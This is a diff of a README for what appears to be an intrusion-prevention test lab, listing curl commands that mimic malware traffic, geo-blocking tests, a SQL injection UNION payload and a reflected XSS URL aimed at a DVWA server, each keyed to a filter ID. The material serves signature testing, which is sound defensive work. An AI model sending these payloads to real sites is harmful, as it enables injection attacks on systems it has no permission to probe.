@@ -58,9 +58,9 @@ Below is the list of outbound attacks you can perform from your Wordpress WebSer
 
 | Filter ID  | Attack                                                   |
 | :--------- | :------------------------------------------------------------ |
-| 25492      | curl -H 'User-Agent: sdvntyer' http://www.example.com/api/v88 |
-| 34738      | curl 'http://www.example.com/includes/main.php?t=7d4580a3910c54d62b46f24c397c8d59&f=g2&type=cmd&id=D7CB4B6E5A21CA596DE0A7E10059C85E'|
-| 38451      | curl -H 'User-Agent: ArcherGhost' -d 'post=eyJkYXRhIjogeyJkb21haW4iOiAiaHR0cDovL3RhcmdldDEyMy5jb20vYXNzZXRzL3ZlbmRvci9waHB1bml0L3BocHVuaXQvc3JjL1V0aWwvUEhQL3Nzc3AucGhwIiwgInNlcnZlciI6ICIxOTIuMTY4LjEwNy4xOSIsICJ0aXRsZSI6ICJqcSJ9LCAidHlwZSI6ICJzY2FubmVyIn0%3D' http://www.example.com/adeliap/404.php |
+| 25492      | `curl -H 'User-Agent: sdvntyer' http://www.example.com/api/v88` |
+| 34738      | `curl 'http://www.example.com/includes/main.php?t=7d4580a3910c54d62b46f24c397c8d59&f=g2&type=cmd&id=D7CB4B6E5A21CA596DE0A7E10059C85E'`|
+| 38451      | `curl -H 'User-Agent: ArcherGhost' -d 'post=eyJkYXRhIjogeyJkb21haW4iOiAiaHR0cDovL3RhcmdldDEyMy5jb20vYXNzZXRzL3ZlbmRvci9waHB1bml0L3BocHVuaXQvc3JjL1V0aWwvUEhQL3Nzc3AucGhwIiwgInNlcnZlciI6ICIxOTIuMTY4LjEwNy4xOSIsICJ0aXRsZSI6ICJqcSJ9LCAidHlwZSI6ICJzY2FubmVyIn0%3D' http://www.example.com/adeliap/404.php` |
 
 ### Geo Filter Attacks
 
@@ -70,8 +70,8 @@ Below is the list of geofilter attacks you can perform from your Wordpress WebSe
 
 | Region | Attack |
 | :----- | :----------------------|
-| China  | curl https://baidu.com |
-| Russia | curl https://mail.ru   |
+| China  | `curl https://baidu.com` |
+| Russia | `curl https://mail.ru `  |
 
 ### SQL Attacks
 
@@ -89,4 +89,4 @@ Below are some SQL attacks you can perform on your DVWA server
 | Filter ID  | Attack                                                   |
 | :--------- | :------------------------------------------------------------ |
 | 3593      | 1. Go to SSL Injection menu on the side navigation panel<br />2. Enter `?id=a' UNION SELECT "text1","text2";-- -&Submit=Submit` in "User ID" text box and hit submit |
-| 12365      | curl 'http://www.example.com/includes/main.php?t=7d4580a3910c54d62b46f24c397c8d59&f=g2&type=cmd&id=D7CB4B6E5A21CA596DE0A7E10059C85E'|
+| 12365      | On your browser, enter `http://<DVWAPublicIP>/vulnerabilities/xss_d/?default=English%3Cscript%3Ealert(1)%3C/script%3E` |
